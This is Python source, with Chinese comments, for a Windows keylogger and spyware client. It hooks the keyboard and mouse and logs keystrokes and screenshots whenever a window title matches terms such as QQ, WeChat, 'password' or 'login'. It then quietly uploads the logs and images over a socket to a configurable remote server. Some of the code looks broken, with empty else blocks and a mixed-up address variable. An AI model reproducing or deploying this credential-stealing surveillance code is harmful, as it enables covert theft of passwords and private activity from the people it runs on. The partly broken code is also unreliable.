import pythoncom
import PyHook3
import os
import time
import socket
import sys
from PIL import ImageGrab

#------我们用关键词去筛选，软件会在什么时候去监听记录截屏
lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']

MSG=""
save_to=1
title_word=""
global_title=""
rADDR=""
runstatus=1
BUFSIZE=1024
set_encoding="utf-8"
clientSockfd=""
open_filename='D:/QQdata/data/Monitor.txt'
dos_filename='D:\\QQdata\\data\\Monitor.txt'
dos_pic_dir='D:\\QQdata\\data\\xx11\\'
#上面都是全局变量，由于初版本比较早完成，所以大部分都是使用全局变量请谅解。

def checkfile(file_name, i, BUFSIZE):
#检测传输数据包的完整性
    j,rate=0,0
    fsize=os.path.getsize(file_name)
    times=int(fsize/BUFSIZE)
    if i<times:
        j=BUFSIZE*i
        rate=int(j/fsize*100+1)
    elif i>=times and rate<100 or fsize<BUFSIZE:
        rate,j=100,fsize
    #返回目前包的大小和完成率
    return j,rate

def sendfile(clientSockfd, file_name, set_encoding, BUFSIZE):
#发送数据包函数到服务端
    i=0
    f=open(file_name, 'rb')
    while True:
        msg=f.read(BUFSIZE)
        if not msg:
            #print('读取空包')
            break
        else:
            i+=1
            j,rate=checkfile(file_name,i,BUFSIZE)
            #print('正在发送',file_name,'数据包完整性：{}% 大小{}B{}'.format(rate,j,'\x0D'), end='')
            #这里为了演示动态传输效果设置了时间延迟，建议注释不然会影响速度和造成卡顿
            #time.sleep(0.0001)
        clientSockfd.sendall(msg)
    f.close()
    clientSockfd.sendall(bytes('EOF',encoding=set_encoding))
    #print('{} 成功发包'.format(file_name))
    #print(recv_message(clientSockfd, set_encoding, BUFSIZE))

def recv_message(clientSockfd,set_encoding,BUFSIZE):
#接收数据包并返回其内容，可用于后期远程控制。
    msg=clientSockfd.recv(BUFSIZE)
    if not msg or msg==bytes('EOF',encoding=set_encoding):
        return False
    return msg

def confirm(clientSockfd, filetype, set_encoding, BUFSIZE):
#确认数据包类型函数
    clientSockfd.send(bytes(filetype, encoding=set_encoding))
    msg=clientSockfd.recv(BUFSIZE)
    if msg==bytes('NO PROBLEM', encoding=set_encoding):
        #print('{} NO PROBLEM'.format(filetype))
        return True

def handle(clientSockfd, filename, filetype, set_encoding, BUFSIZE):
#客户端握手函数
    if filetype=='txt' or filetype=='pic':
        #当发现文件类型为文本或图片就会调用下面确认类型函数。
        if confirm(clientSockfd, filetype, set_encoding, BUFSIZE):
            #如果是成功接收数据包NO PROBLEM则会发送全部数据，也是socket的核心函数集
            sendfile(clientSockfd, filename, set_encoding, BUFSIZE)
        else:
            #print('{} 发包失败'.format(filetype))
    else:
        #print('文件类型识别失败！')

def write_msg_to_txt(msg, filetype):
    #global是全局变量的意思，如果不带入global则无法通用
    global clientSockfd
    global set_encoding
    global BUFSIZE
    global open_filename

    f=open(open_filename,'w')
    f.write(msg+'\x0A')
    f.close()
    handle(clientSockfd, open_filename, filetype, set_encoding, BUFSIZE)

def get_local_time(press):
#获取时间函数
    if press=='keyboard':
        return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
    else:
        return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))

def get_local_image(dos_pic_dir):
#获取截屏并生成当前时间格式存储本地
    global clientSockfd
    global BUFSIZE

    pic_lists =os.listdir(dos_pic_dir)
    #检测客户端本地存储超过一百张则全部清空
    if len(pic_lists) >100:
        for pl in pic_lists:
            fpath=dos_pic_dir+pl
            if os.path.isfile(fpath):
                os.remove(fpath)
    pic=ImageGrab.grab()
    pic_name='D:/QQdata/data/xx11/mouse_%s.jpg' %get_local_time("")
    pic.save('%s' %pic_name)
    return pic_name

def onMouseEvent(event):
#hook鼠标监控函数
    global lists
    global MSG
    global global_title
    global dos_pic_dir

    mouse_status=event.MessageName
    pic_msg=""
    #当鼠标左键和右键点击的时候回触发,下面截屏和键盘记录函数
    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
        if global_title in lists:
            if MSG!="":
                write_msg_to_txt(MSG, 'txt')
                pic_msg=get_local_image(dos_pic_dir)
                write_msg_to_txt(pic_msg, 'txt')
                handle(clientSockfd, pic_msg, 'pic', set_encoding, BUFSIZE)
            global_title=""
    return True

def onKeyboardEvent(event):
#hook键盘监控函数
    global lists
    global MSG
    global title_word
    global global_title

    #当前监控的的Ascii十进制数值
    keyid=event.Ascii
    #Ascii十进制32-127以内，部分是无法显示
    keychar=chr(event.Ascii)
    #Ascii明文，大部分都是依靠下面变量去判断
    keyword=event.Key
    #当前窗口如QQ或bilibili的名称
    title=event.WindowName

    words=''
    status=1
    title_status=1
    break_status=1

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        global_title=words
                        title_status=0
                        break_status=0
                        break
            if break_status==0:
                break
            words=''
    #下面函数则是键盘记录的核心，我已经绞尽脑汁了。
    if title_status==0:
        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
            and keyword!="Lshift" and keyword!="Rshift"
            ):
            title_word=title
            MSG=get_local_time('keyboard')+title+"窗口: "
        if 127 > keyid >32:
            MSG+=keychar
        else:
            if keyword=="Return":
                MSG+="<回车>"
                status=0
            elif keyword=="Tab":
                MSG+="<水平制表>"
            elif keyword=="Back":
                MSG+="<退格>"
            elif keyword=="Delete":
                MSG+="<删除>"
            elif keyword=="Space":
                MSG+="<空格>"
    if status == 0:
        if MSG!="":
            #当触发如回车或者一些特殊按键时候则触发记录
            write_msg_to_txt(MSG, 'txt')
        title_word=""
        global_title=""
        kwords=""
    # 同鼠标事件监听函数的返回值
    return True

def main():
    global rADDR
    global runstatus
    global clientSockfd
    global dos_pic_dir
    global dos_filename

    #print('正在检测配置文件{}'.format('.'*4))
    current_path=os.path.abspath('.')
    config_name='Monitor_config.txt'
    config_file=current_path+'\\'+config_name

    #-----手动修改Monitor_config.txt文件，如果有配置文件则不需要重复输入IP和端口号
    #----把服务端的配置文件放在客户端同个目录也可，如果配置错误则需要手动删除配置文件。
    if not os.path.exists(config_file):
        HOST,PORT='',0
        while True:
            if HOST and PORT:
                break
            if not HOST:
                try:
                    HOST=input('请输入正确的服务器IP地址(如www.xxx.com,xxx.xxx.xxx.xxx):')
                except:
                    #print('错误IP格式')
            if not PORT:
                try:
                    PORT=input('请输入正确的服务器端口推荐(6666):')
                except:
                    #print('错误端口')
        rADDR=(HOST,int(PORT))
        f=open(config_file,'w')
        f.write(HOST+'\x0A'+PORT)
        f.close()
    else:
        f=open(config_file, 'r')
        ff=f.read().split()
        HOST,PORT=ff[0],ff[1]
        lADDR=(HOST,int(PORT))

    times=0
    #print('正在布置环境........')
    while True:
        times+=1
        if os.path.exists(dos_filename)==True and os.path.exists(dos_pic_dir):
            #print('成功创建{}和{}'.format(dos_pic_dir,dos_filename))
            break
        elif times>=5:
            #print('无法成功创建{}和{}'.format(dos_pic_dir,dos_filename))
            #print('请手动创建，或管理权限执行。')
            sys.exit()
        os.system('mkdir %s >nul' %dos_pic_dir)
        os.system('type nul > %s' %dos_filename)

    times=0
    #print('正在连接服务器......')
    while True:
        ltime=time.strftime('%S',time.localtime(time.time()))
        #每10秒就会尝试连接一次服务器
        if int(ltime)%10==0:
            times+=1
            #超过半小时依旧无法连接则断开
            if times>=180:
                #print('已超时半小时，无法连接服务器。')
                sys.exit()
            try:
                #客户端数字传输类型ip4和TCP
                clientSockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                #连接服务器
                clientSockfd.connect(rADDR)
                #print("已建立连接{}".format('.'*10),rADDR)
                runstatus=0
                break
            except socket.error:
                #print('无法正常连接:{}，错误:请检查服务器是否开启!!!'.format(str(rADDR)))
        else:
            time.sleep(1)
    if runstatus==0:
        # 创建一个“钩子”管理对象
        hm = PyHook3.HookManager()
        # 监听所有鼠标事件钩子
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        # 监听所有键盘事件钩子
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        # 进入循环，如不手动关闭，程序将一直处于监听状态
        pythoncom.PumpMessages()
if __name__ == "__main__":
    main()

